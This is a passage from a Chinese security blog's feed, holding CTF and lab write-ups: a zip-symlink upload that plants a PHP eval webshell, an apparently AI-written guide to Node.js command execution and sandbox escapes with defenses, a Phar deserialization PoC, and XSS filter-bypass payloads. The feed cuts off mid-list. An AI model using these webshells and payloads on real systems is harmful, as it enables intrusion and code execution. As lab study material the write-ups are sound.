    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>unzip</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/unzip/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/unzip/</id>
    <published>2025-03-27T16:51:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有个upload.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">  error_reporting(0); </span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE); </span><br><span class="line"></span><br><span class="line">if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;  </span><br><span class="line">    //这里是验证MIME值，确定上传的文件类型为zip，同时也为我们指明了方向，要上传一个zip压缩包。</span><br><span class="line">    </span><br><span class="line">    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); </span><br><span class="line">  //这里的意思是进入/tmp目录下，然后调用unzip命令对压缩包进行解压，也就是把压缩包解压到/tmp目录下。  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//only this! </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>要传🐎，但是路径是&#x2F;tmp<br>考虑软连接</p><p>要创建软链接，可以使用ln -s命令，其基本语法如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s [源文件或目录] [目标文件或目录]</span><br></pre></td></tr></table></figure></div><p>注意：在指定源文件或目录和目标文件或目录时，不要在路径后面加上斜杠(&#x2F;)。例如，要在当前目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test目录的软链接test，可以执行：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test test</span><br></pre></td></tr></table></figure></div><p>如果要在&#x2F;var目录下创建一个指向&#x2F;var&#x2F;www&#x2F;test的软链接test，则执行：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/test /var/test</span><br></pre></td></tr></table></figure></div><p>于是,我们创建一个指向&#x2F;www&#x2F;html&#x2F;的软连接&#x2F;tmp&#x2F;test</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /var/www/html /tmp/test</span><br></pre></td></tr></table></figure></div><p>压缩为zip传上去</p><p>🐎mama.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure></div><p>路径为&#x2F;test&#x2F;mama.php压缩为zip</p><p>访问mama.php开始找flag<br>flag在&#x2F;flag下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>nodejs执行命令</title>
    <link href="http://example.com/2025/03/24/web/nodejs/nodejs/"/>
    <id>http://example.com/2025/03/24/web/nodejs/nodejs/</id>
    <published>2025-03-24T20:49:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>以下是 <strong>Node.js 中执行系统命令的各种方法</strong> 的详细介绍，包括适用场景、实现方式和安全注意事项：</p><hr><h2 id="1-child-process-exec（标准方式）"><a href="#1-child-process-exec（标准方式）" class="headerlink" title="1. child_process.exec（标准方式）"></a><strong>1. <code>child_process.exec</code>（标准方式）</strong></h2><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>常规 Node.js 环境下执行 Shell 命令。</li><li>适用于需要获取命令输出或错误信息的场景。</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;ls -la&#x27;</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Output: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ <strong>标准方法</strong>，官方推荐。<br>✅ 可以获取命令的 <strong>完整输出</strong>（<code>stdout</code>&#x2F;<code>stderr</code>）。<br>❌ 如果用户输入未过滤，可能导致 <strong>命令注入（RCE）</strong>。  </p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>使用 <code>execFile</code>（避免 Shell 解析）：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">execFile</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-la&#x27;</span>], <span class="function">(<span class="params">error, stdout</span>) =&gt;</span> &#123; ... &#125;);</span><br></pre></td></tr></table></figure></div></li><li>对用户输入进行 <strong>严格过滤</strong>（如白名单校验）。</li></ul><hr><h2 id="2-process-mainModule-constructor-load（绕过-require-限制）"><a href="#2-process-mainModule-constructor-load（绕过-require-限制）" class="headerlink" title="2. process.mainModule.constructor._load（绕过 require 限制）"></a><strong>2. <code>process.mainModule.constructor._load</code>（绕过 <code>require</code> 限制）</strong></h2><h3 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>某些环境禁用 <code>require</code>，但仍需动态加载模块（如沙箱逃逸）。</li></ul><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">childProcess.<span class="title function_">exec</span>(<span class="string">&#x27;恶意命令&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可以绕过部分 <strong><code>require</code> 限制</strong>。<br>❌ 依赖 <code>global.process</code> 的访问权限。<br>❌ <strong>容易被安全工具检测</strong>（如 WAF）。  </p><h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>禁止修改 <code>global.process</code>：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="variable language_">global</span>.<span class="property">process</span>);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="3-vm-沙箱逃逸（利用漏洞执行命令）"><a href="#3-vm-沙箱逃逸（利用漏洞执行命令）" class="headerlink" title="3. vm 沙箱逃逸（利用漏洞执行命令）"></a><strong>3. <code>vm</code> 沙箱逃逸（利用漏洞执行命令）</strong></h2><h3 id="适用场景-2"><a href="#适用场景-2" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>当代码运行在 <code>vm</code> 沙箱中，但沙箱配置不严格时。</li></ul><h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  this.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).exec(&#x27;恶意命令&#x27;);</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line">script.<span class="title function_">runInNewContext</span>(&#123;&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过简单沙箱限制。<br>❌ 依赖 <strong>沙箱配置错误</strong>（如未隔离原型链）。<br>❌ 高版本 Node.js 已修复部分漏洞。  </p><h3 id="防御措施-2"><a href="#防御措施-2" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>使用更安全的沙箱（如 <a href="https://github.com/patriksimek/vm2"><code>vm2</code></a>）。</li><li>禁止访问 <code>constructor</code>：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">&#x27;代码&#x27;</span>, &#123;&#125;, &#123; <span class="attr">timeout</span>: <span class="number">1000</span> &#125;);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="4-process-binding（底层-API）"><a href="#4-process-binding（底层-API）" class="headerlink" title="4. process.binding（底层 API）"></a><strong>4. <code>process.binding</code>（底层 API）</strong></h2><h3 id="适用场景-3"><a href="#适用场景-3" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>需要直接调用 Node.js 底层 C++ 绑定（如 <code>spawn_sync</code>）。</li></ul><h3 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">process.<span class="title function_">binding</span>(<span class="string">&#x27;spawn_sync&#x27;</span>).<span class="title function_">spawn</span>(&#123;</span><br><span class="line">  <span class="attr">file</span>: <span class="string">&#x27;bash&#x27;</span>,</span><br><span class="line">  <span class="attr">args</span>: [<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;恶意命令&#x27;</span>],</span><br><span class="line">  <span class="attr">stdio</span>: [<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 绕过 <code>child_process</code> 模块限制。<br>❌ <strong>依赖 Node.js 版本</strong>（新版可能移除该 API）。<br>❌ 需要进程权限。  </p><h3 id="防御措施-3"><a href="#防御措施-3" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>限制 <code>process.binding</code> 访问：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> process.<span class="property">binding</span>;</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="5-Worker-Threads（多线程执行）"><a href="#5-Worker-Threads（多线程执行）" class="headerlink" title="5. Worker Threads（多线程执行）"></a><strong>5. <code>Worker Threads</code>（多线程执行）</strong></h2><h3 id="适用场景-4"><a href="#适用场景-4" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>在 Worker 线程中隐藏恶意代码。</li></ul><h3 id="代码示例-4"><a href="#代码示例-4" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Worker</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;worker_threads&#x27;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span></span><br><span class="line"><span class="string">  exec(&#x27;恶意命令&#x27;);</span></span><br><span class="line"><span class="string">`</span>, &#123; <span class="attr">eval</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-4"><a href="#特点-4" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过主线程监控。<br>❌ 需要启用 <code>eval: true</code>。<br>❌ 可能被 <strong>进程监控工具</strong> 发现。  </p><h3 id="防御措施-4"><a href="#防御措施-4" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>禁止动态 Worker 代码：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;file.js&#x27;</span>); <span class="comment">// 只允许文件加载</span></span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="6-fs-exec（写入脚本后执行）"><a href="#6-fs-exec（写入脚本后执行）" class="headerlink" title="6. fs + exec（写入脚本后执行）"></a><strong>6. <code>fs + exec</code>（写入脚本后执行）</strong></h2><h3 id="适用场景-5"><a href="#适用场景-5" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>当直接执行命令被拦截，但允许写入文件时。</li></ul><h3 id="代码示例-5"><a href="#代码示例-5" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;/tmp/exploit.sh&#x27;</span>, <span class="string">&#x27;恶意命令&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash /tmp/exploit.sh&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="特点-5"><a href="#特点-5" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过简单命令黑名单。<br>❌ 依赖 <strong>文件写入权限</strong>。<br>❌ 可能被 <strong>文件监控</strong> 检测。  </p><h3 id="防御措施-5"><a href="#防御措施-5" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>限制临时目录写入权限。</li><li>监控敏感文件创建（如 <code>/tmp/exploit.sh</code>）。</li></ul><hr><h2 id="总结对比表"><a href="#总结对比表" class="headerlink" title="总结对比表"></a><strong>总结对比表</strong></h2><table><thead><tr><th>方法</th><th>适用场景</th><th>绕过能力</th><th>防御措施</th></tr></thead><tbody><tr><td><code>child_process.exec</code></td><td>常规命令执行</td><td>❌</td><td>输入过滤 + <code>execFile</code></td></tr><tr><td><code>process.mainModule._load</code></td><td>绕过 <code>require</code> 限制</td><td>✅</td><td>冻结 <code>global.process</code></td></tr><tr><td><code>vm</code> 沙箱逃逸</td><td>沙箱环境</td><td>✅（需漏洞）</td><td>使用 <code>vm2</code> 沙箱</td></tr><tr><td><code>process.binding</code></td><td>底层 API 调用</td><td>✅</td><td>删除 <code>process.binding</code></td></tr><tr><td><code>Worker Threads</code></td><td>多线程隐藏执行</td><td>✅</td><td>禁用 <code>eval: true</code></td></tr><tr><td><code>fs + exec</code></td><td>文件写入后执行</td><td>✅</td><td>文件监控 + 权限限制</td></tr></tbody></table><hr><h2 id="终极防御建议"><a href="#终极防御建议" class="headerlink" title="终极防御建议"></a><strong>终极防御建议</strong></h2><ol><li><strong>最小权限原则</strong>：Node.js 进程以低权限用户运行。</li><li><strong>输入过滤</strong>：禁止用户输入进入 <code>exec</code>、<code>eval</code> 等。</li><li><strong>依赖检查</strong>：避免使用恶意第三方包（如 <code>npm audit</code>）。</li><li><strong>WAF</strong>：使用 Web 应用防火墙拦截可疑请求。</li><li><strong>沙箱隔离</strong>：敏感操作放在受限环境（如 Docker、<code>vm2</code>）。</li></ol><hr><p>⚠️ <strong>重要提醒</strong>：以上方法仅限 <strong>授权渗透测试</strong>，未经授权使用属 <strong>违法行为</strong>！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="nodejs" scheme="http://example.com/categories/nodejs/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ai写的" scheme="http://example.com/tags/ai%E5%86%99%E7%9A%84/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-03-20T21:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Phar反序列化是一种利用Phar文件的特性进行攻击的方法。Phar文件是一种压缩文件，类似于Java中的JAR包，Phar文件会以序列化的形式存储用户自定义的meta-data，从而扩展反序列化漏洞的攻击面</p><h2 id="反序列化的条件"><a href="#反序列化的条件" class="headerlink" title="反序列化的条件"></a>反序列化的条件</h2><p>要实现Phar反序列化，需要满足以下几个条件：</p><p>Phar文件能够上传到服务器端：攻击者需要能够将Phar文件上传到目标服务器，以便利用Phar文件中的序列化数据进行反序列化攻击</p><p>存在可利用的魔术方法：Phar文件中的meta-data会在反序列化时被解析，因此需要有可利用的魔术方法（如__destruct、__wakeup等）作为“跳板”，以便在反序列化过程中执行恶意代码</p><p>文件操作函数的参数可控：需要能够控制文件操作函数的参数，并且这些参数中包含特殊字符（如:、&#x2F;、phar等）没有被过滤。这样可以通过Phar伪协议读取并解析Phar文件，从而触发反序列化</p><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>以下是一个简单的Phar文件生成示例：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo &#x27;Destruct called&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); // 后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 设置stub</span><br><span class="line">$o = new TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); // 将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); // 添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>在生成Phar文件后，可以通过以下代码触发反序列化：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename = &#x27;phar://phar.phar/test.txt&#x27;;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><h2 id="重要注意事项"><a href="#重要注意事项" class="headerlink" title="重要注意事项"></a>重要注意事项</h2><p>在进行Phar反序列化攻击时，需要注意以下几点：</p><p>Phar文件的生成：生成Phar文件时，需要将php.ini中的phar.readonly选项设置为Off，否则无法生成Phar文件</p><p>绕过检测 条件竞争等方案来传🐎</p><p>通过满足上述条件，可以在不调用unserialize()函数的情况下实现Phar反序列化攻击，从而执行恶意代码。</p><p><a class="link"   href="https://xz.aliyun.com/news/6303?time__1311=YqIxgD070=BDlhzG7FD8K9P0K4Dv=NdG8AeD&u_atoken=2ce2353c671e67892a58d8137a023870&u_asig=0a472f8c17424763875994781e014c" >这个更详细 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="php反序列化" scheme="http://example.com/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php伪协议" scheme="http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>upload</title>
    <link href="http://example.com/2025/03/19/web/upload/upload/"/>
    <id>http://example.com/2025/03/19/web/upload/upload/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="有时间再写"><a href="#有时间再写" class="headerlink" title="有时间再写"></a>有时间再写</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="upload" scheme="http://example.com/categories/upload/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab</title>
    <link href="http://example.com/2025/03/19/web/xss/xss-lab/"/>
    <id>http://example.com/2025/03/19/web/xss/xss-lab/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>没有过滤</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>代码插入””里面</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>代码插入到’’里面<br>而且将符号实体化了</p><p>{onfocus事件在元素获得焦点时触发，最常与 <input>、<select> 和 <a> 标签一起使用，以上面图片的html标签<input>为例，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码}</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure></div><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; onfocus=javascript:alert() &lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>onfocus似掉了<br>换一个姿势</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>a href也寄掉了，但是没有过滤大小写</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>判断检测到上面的就会自动删除该单词</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert()&lt;/scscriptript&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>javascript:alert(“xss”)发现不可以用，&#x2F;&#x2F;注释也不可以用<br>考虑用unioncode编码之后绕过</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span><br></pre></td></tr></table></figure></div><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>在8题基础上面添加了检查有没有http:&#x2F;&#x2F;</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;//http://</span><br></pre></td></tr></table></figure></div><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>研究ing</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="XSS" scheme="http://example.com/categories/XSS/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="http://example.com/2025/03/19/web/xss/xss/"/>
    <id>http://example.com/2025/03/19/web/xss/xss/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="常见的姿势"><a href="#常见的姿势" class="headerlink" title="常见的姿势"></a>常见的姿势</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;xxx&lt;/a&gt; //添加标签，但是必须要点击标签才有效</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;image src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;body onload=alert(1)&gt; // 在页面加载完成后执行onload指定的函数</span><br><span class="line">&lt;svg onload=alert(1)&gt; // 在SVG图像加载完成后执行onload指定的函数</span><br><span class="line">&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt; // 